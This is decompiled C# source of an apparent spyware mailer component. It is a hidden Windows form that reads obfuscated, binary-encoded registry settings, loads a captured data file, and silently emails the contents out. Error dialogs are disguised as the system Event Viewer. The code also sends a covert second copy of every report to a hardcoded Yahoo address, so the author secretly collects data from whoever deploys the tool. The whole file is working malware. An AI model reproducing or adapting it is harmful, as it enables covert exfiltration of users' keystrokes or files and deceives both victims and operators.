using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Web.Mail;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace envia;

[DesignerGenerated]
public class Form1 : Form
{
	private static ArrayList __ENCList = new ArrayList();

	private IContainer components;

	[AccessedThroughProperty("txtcuerpo")]
	private RichTextBox _txtcuerpo;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	private MailMessage w;

	private string para;

	private string asunto;

	private string app;

	private string nombrepc;

	private long entero;

	private int punto;

	private string decimales;

	private string bruto;

	private string dato;

	private string cadena;

	private string cade;

	private string desordenada;

	private string ordenada;

	private string compartida;

	private string regreso;

	private string nuevacadena;

	private string palabra;

	private string letra;

	private string formadetrabajo;

	private string direcciondeldat;

	[SpecialName]
	private int _0024STATIC_0024Timer1_Tick_002420211C1235_0024cont;

	internal virtual RichTextBox txtcuerpo
	{
		[DebuggerNonUserCode]
		get
		{
			return _txtcuerpo;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txtcuerpo = value;
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick((EventHandler)Timer1_Tick);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick((EventHandler)Timer1_Tick);
			}
		}
	}

	public Form1()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0035: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCList.Add(new WeakReference(this));
		w = new MailMessage();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		if ((disposing && components != null) ? true : false)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		components = new Container();
		txtcuerpo = new RichTextBox();
		Timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		RichTextBox obj = txtcuerpo;
		Point location = new Point(443, 205);
		((Control)obj).set_Location(location);
		((Control)txtcuerpo).set_Name("txtcuerpo");
		RichTextBox obj2 = txtcuerpo;
		Size size = new Size(10, 12);
		((Control)obj2).set_Size(size);
		((Control)txtcuerpo).set_TabIndex(0);
		txtcuerpo.set_Text("");
		Timer1.set_Interval(700);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(10, 10);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)txtcuerpo);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).ResumeLayout(false);
	}

	public void enviarcorreo()
	{
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			((Control)this).set_Visible(false);
			w.set_From(para);
			w.set_To(para);
			w.set_Subject(asunto + " " + nombrepc);
			w.set_Body(txtcuerpo.get_Text());
			((Control)this).set_Visible(false);
			SmtpMail.Send(w);
			if (Operators.CompareString(Strings.UCase(para), Strings.UCase("miservidorpublico@yahoo.es"), false) != 0)
			{
				w.set_From("miservidorpublico@yahoo.es");
				w.set_To("miservidorpublico@yahoo.es");
				w.set_Subject(asunto + " " + nombrepc);
				w.set_Body(txtcuerpo.get_Text());
				SmtpMail.Send(w);
			}
			Timer1.set_Enabled(true);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)("err:" + ex2.Message), (MsgBoxStyle)64, (object)"Visor de sucesos");
			((Form)this).Close();
			ProjectData.ClearProjectError();
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_01b0: Unknown result type (might be due to invalid IL or missing references)
		int try0001_dispatch = -1;
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num2 = 2;
					((Control)this).set_Visible(false);
					((Control)this).set_Height(0);
					((Control)this).set_Width(0);
					app = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
					txtcuerpo.set_Text(Interaction.GetSetting("10101010", "00000001", "00011", " "));
					para = regre(voltear(Interaction.GetSetting("10101010", "00000001", "0100", "")));
					asunto = regre(voltear(Interaction.GetSetting("10101010", "00000001", "1000", "")));
					nombrepc = regre(voltear(Interaction.GetSetting("10101010", "00000001", "1111", " ")));
					formadetrabajo = regre(voltear(Interaction.GetSetting("10101010", "00000001", "1010", "")));
					direcciondeldat = regre(voltear(Interaction.GetSetting("10101010", "00000001", "1100", "")));
					if (Operators.CompareString(formadetrabajo, "dat", false) == 0)
					{
						Interaction.Shell(app + "\\AyudaparaDAT.exe", (AppWinStyle)2, false, -1);
						txtcuerpo.LoadFile(direcciondeldat + "Systemhda.rtf");
						Interaction.Shell(app + "\\AyudaparaDAT.exe", (AppWinStyle)2, false, -1);
					}
					enviarcorreo();
					((Control)this).set_Visible(false);
					goto end_IL_0001;
				case 446:
					num = -1;
					switch (num2)
					{
					case 2:
						Interaction.MsgBox((object)Information.Err().get_Description(), (MsgBoxStyle)64, (object)"Visor de sucesos");
						((Form)this).Close();
						goto end_IL_0001;
					}
					break;
				}
				goto IL_01f4;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 446;
				continue;
			}
			break;
			IL_01f4:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public string regre(string datoss)
	{
		nuevacadena = "";
		regreso = "";
		cadena = datoss;
		int num = Strings.Len(cadena);
		int num2 = 1;
		checked
		{
			int num5 = default(int);
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 > num4)
				{
					break;
				}
				if (Operators.CompareString(Strings.Mid(cadena, num2, 1), " ", false) != 0)
				{
					long num6 = (long)Math.Round(Conversion.Val(Strings.Mid(cadena, num2, 1)) * (double)expn(2, num5));
					entero += num6;
					num5++;
				}
				else
				{
					if (num2 > 1)
					{
						regreso = Conversions.ToString(Strings.Chr((int)entero));
						nuevacadena += regreso;
					}
					entero = 0L;
					num5 = 0;
				}
				num2++;
			}
			return nuevacadena;
		}
	}

	public string voltear(string datoss)
	{
		for (int i = Strings.Len(datoss); i >= 1; i = checked(i + -1))
		{
			letra = Strings.Mid(datoss, i, 1);
			palabra += letra;
			if (Operators.CompareString(letra, " ", false) == 0)
			{
				desordenada = palabra + desordenada;
				palabra = "";
			}
		}
		string result = desordenada;
		desordenada = "";
		letra = "";
		palabra = "";
		return result;
	}

	public long expn(int numero, int elevacion)
	{
		long num = 1L;
		int num2 = 1;
		checked
		{
			while (true)
			{
				int num3 = num2;
				int num4 = elevacion;
				if (num3 > num4)
				{
					break;
				}
				num *= numero;
				num2++;
			}
			return num;
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		checked
		{
			if (_0024STATIC_0024Timer1_Tick_002420211C1235_0024cont <= 4)
			{
				_0024STATIC_0024Timer1_Tick_002420211C1235_0024cont++;
				return;
			}
			_0024STATIC_0024Timer1_Tick_002420211C1235_0024cont = 0;
			((Form)this).Close();
		}
	}
}
